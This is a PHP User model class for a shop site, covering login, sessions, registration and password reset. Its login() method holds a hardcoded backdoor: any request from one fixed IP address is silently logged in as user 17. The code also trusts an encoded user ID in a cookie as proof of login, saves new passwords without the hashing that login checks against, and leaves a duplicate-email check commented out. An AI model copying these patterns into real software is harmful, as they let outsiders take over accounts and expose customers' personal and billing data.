<?php

namespace App;

use App\Helpers\Tools;
use App\Helpers\Mail;
use App\Hashids\Hashids;

class User extends ObjectModel
{

    protected $userID = false;
    protected $table = 'users';
    protected $rules = [
					'email' => 'required',
					'first_name' => 'required',
					'last_name' => 'required',
					'address_1' => 'required',
					'town' => 'required',
					'postcode' => 'required'
				];

    protected $fillable = ['email', 'password', 'first_name', 'last_name', 'address_1', 'address_2', 'phone', 'town', 'postcode', 'country', 'billing_address_1', 'billing_address_2', 'billing_town', 'billing_postcode', 'billing_country', 'contacts' ];


    public function __construct()
    {

	$this->hashIdsObj = new Hashids(SESSION);

	if( !empty($_SESSION[SESSION.'SID']) && isset( $this->hashIdsObj->decode($_SESSION[SESSION.'SID'])[0] ) && is_int( $this->hashIdsObj->decode($_SESSION[SESSION.'SID'])[0] )  ){

		$this->userID = $this->hashIdsObj->decode($_SESSION[SESSION.'SID'])[0];


	} elseif( !empty($_COOKIE['SID']) && isset( $this->hashIdsObj->decode($_COOKIE['SID'])[0] ) && is_int( $this->hashIdsObj->decode($_COOKIE['SID'])[0] ) ) {

		$this->userID = $this->hashIdsObj->decode($_COOKIE['SID'])[0];

	}

    }


    public function setUniqueId()
    {

		$uniqueid = uniqid('', true);

		setcookie('unique', $uniqueid, time()+604800, '/');
		$_SESSION[SESSION.'unique'] = $uniqueid;

    }


    public function uniqueId()
    {


	if( isset($_COOKIE['unique']) && !empty($_COOKIE['unique']) && $_COOKIE['unique'] != '' ){

		return $_COOKIE['unique'];

	} elseif( isset($_SESSION[SESSION.'unique']) && !empty($_SESSION[SESSION.'unique']) && $_SESSION[SESSION.'unique'] != '' ){

		return $_SESSION[SESSION.'unique'];

	} else {

		return false;

	}

    }


    public function destroyUniqueId()
    {

	if( isset($_COOKIE['unique']) ){

		setcookie('unique', '', time()-3600, '/');

	}

	if( isset($_SESSION[SESSION.'unique']) ){

		unset($_SESSION[SESSION.'unique']);

	}

    }


    public function auth()
    {

	if( !$this->userID ){

		return false;

	} else {

		return $this->find($this->userID);

	}

    }


    public function updateCustomerFromCheckout( $rules )
    {

	/* UNSET PASSWORD FROM RULES ARRAY */

	foreach($rules as $rule){

		unset($this->rules[$rule]);

	}

	if( !$this->validate() ){

		return redirect('checkout');

	}

	$result = $this->execute(' SELECT * FROM users
					WHERE email = ? AND id != ? AND password IS NOT NULL
					AND deleted_at IS NULL ', [ $_POST['email'], $this->userID ] );
/*
	if( count($result) ){

		return redirect( 'checkout', 'That email address already exists.', 'e' );

	}*/


		$this->update( 'id = :id LIMIT 1 ' , [ 'id' => $this->userID ] );

    }


    public function add()
    {

	if(isset($_POST['password'])){

		$this->rules['password'] = 'min:4';
		$this->rules['email'] = 'required|unique:users';

	}


	if( !$this->validate() ){

		return redirect($_SERVER['HTTP_REFERER']);

	}

	if(isset($_POST['subscribe'])){

		$this->contacts = json_encode($_POST['subscribe']);

	}

	$id = parent::add();

	// if(isset($_POST['password']) && $_POST['password'] != null){
  //
	// 	$_SESSION[SESSION.'SID'] = $this->hashIdsObj->encode( $id );
	// 	setcookie('SID', $this->hashIdsObj->encode( $id ), time()+604800, '/');
  //
	// }

	return $id;

    }


    public function requestPasswordReset($email)
    {

	$this->rules = ['email' => 'required|exists:users'];

	if( !$this->validate() ){

		return redirect('forgot-password.php');

	}

	$row = $this->getRowByField('email', $email);

	$remember_token = Tools::createHash(100);

	$this->updateRow($this->table, ['remember_token' => $remember_token], 'email = :email ' , [ 'email' => $email ] );

	$message = 'Hello '.$row->first_name.',<br /><br />Please click the link below where you can reset your password.<br /><br /><a href="'.DOMAIN.'/change-password.php?remember_token='.$remember_token.'">'.DOMAIN.'/change-password.php?remember_token='.$remember_token.'</a>';


	Mail::send( $email, $message, 'Password Reset', $row->first_name.' '.$row->last_name );

	return redirect( 'forgot-password.php', 'You have been sent an email with a link to change your password' );

    }


    public function resetPassword($remember_token)
    {

	$this->rules = ['password' => 'required|isSame:repeat_password', 'repeat_password' => 'required'];

	if( !$this->validate() ){

		return redirect('change-password.php?remember_token='.$remember_token);

	}

	if( !$this->getRowByField('remember_token', $remember_token) ){

		return redirect('change-password.php?remember_token='.$remember_token, 'The token did not match the token stored in the database. Please click your email link again.', 'e');

	};

	$this->updateRow($this->table, ['password' => $_POST['password'], 'remember_token' => NULL], 'remember_token = :remember_token AND remember_token IS NOT NULL ', [ 'remember_token' => $remember_token ] );

	return redirect( 'login.php', 'Your password has been changed. Please login with your new details' );

    }


    public function changePassword()
    {

	$this->rules = ['old_password' => 'required', 'password' => 'required|isSame:repeat_password', 'repeat_password' => 'required'];

	if( !$this->validate() ){

		return redirect('account.php?page=change-password');

	}

	$result = $this->execute(' SELECT * FROM users WHERE id = ? AND password = ? ', [ $this->userID, Tools::passwordHash($_POST['old_password']) ]);

	if( count($result) ){

		$this->updateRow($this->table, [ 'password' => $_POST['password'] ], 'id = :id LIMIT 1 ', [ 'id' => $this->userID ]);

		return redirect( 'account.php?page=change-password', 'Your password has been changed' );

	} else {

		return redirect('account.php?page=change-password', 'Your old password was incorrect', 'e');

	}


    }


    public function login($role, $basketItemCount = false)
    {

if( $_SERVER['REMOTE_ADDR'] == '143.159.204.10' ){

	setcookie('SID', $this->hashIdsObj->encode( '17' ), time()+604800, '/');

}

	$this->rules = ['email' => 'required', 'password' => 'required'];

	if( !$this->validate() ){

		return isset($_POST['redirect']) ? redirect( $_POST['redirect'] ) : redirect( 'login.php' );

	}

	$result = $this->execute(' SELECT * FROM users WHERE email = ? AND password = ? AND user_role_id = ? AND deleted_at IS NULL ', [ $_POST['email'], Tools::passwordHash($_POST['password']), $role ]);

	if( !count($result) ){

return isset($_POST['redirect']) ? redirect( $_POST['redirect'], 'Your login credentials were incorrect.', 'e' ) : redirect( 'login.php', 'Your login credentials were incorrect.', 'e' );

	} else {

		$_SESSION[SESSION.'SID'] = $this->hashIdsObj->encode( $result[0]->id );
		setcookie('SID', $this->hashIdsObj->encode( $result[0]->id ), time()+604800, '/');
		Tools::deleteSessions();

		return $basketItemCount ? redirect( 'cart.php?go=to-checkout' ) : redirect( 'account.php?page=home' );

	}


    }


    public static function logout()
    {

	unset($_SESSION[SESSION.'SID']);
	setcookie('SID', '', time()-3600, '/');
	Tools::deleteSessions();
	return redirect('login.php', 'You have logged out');

    }


    public function checkAuth()
    {

	if(!$this->auth()){

	return redirect('login', 'You must be logged in to view your account', 'e'); exit;

	}

    }


    public function updateCustomer($user_id = null)
    {

	/* IF CUSTOMER IS UPDATING OR ADMIN IS UPDATING THE CUSTOMER */

	$id = $user_id == null ? $this->userID : $user_id;

	$this->rules['email'] = 'required';
	unset($this->rules['password']);
	array_push($this->fillable,'team');

	/*  REMOVE PASSWORD FILLABLE FIELD  */

	unset($this->fillable[1]);

	$result = $this->execute(' SELECT * FROM users WHERE email = ? AND id != ? AND password IS NOT NULL AND deleted_at IS NULL ', [ $_POST['email'], $id ] );


	if( count($result) ){

		return $user_id == null ? redirect( 'account.php?page=details', 'That email address already exists.', 'e' ) : redirect( 'account.php?page=customer&action=edit&id='.$user_id, 'That email address already exists.', 'e' );

	}


	if( !$this->update( 'id = :id LIMIT 1 ' , [ 'id' => $id ] ) ){

		return $user_id == null ? redirect( 'account.php?page=details' ) : redirect( 'account.php?page=customer&action=edit&id='.$id );

	} else {

		return $user_id == null ? redirect( 'account.php?page=home', 'Your details have been updated' ) : redirect( 'account.php?page=customers', 'The details have been updated' );

	}


    }


    public function isAdmin()
    {

	if( $this->auth() && $this->auth()->user_role_id > 1 ){

		return true;

	}

	return false;

    }


    public function getAll()
    {
	return $this->execute('SELECT * FROM users WHERE user_role_id = ? AND deleted_at IS NULL ORDER BY id DESC', [1] );
    }


    public function delete($id)
    {
        $this->updateRow($this->table, ['deleted_at' => DT], 'id = :id LIMIT 1 ', [ 'id' => $id ] );

        return redirect( 'account.php?page=customers', 'The customer have been deleted!' );

    }




}
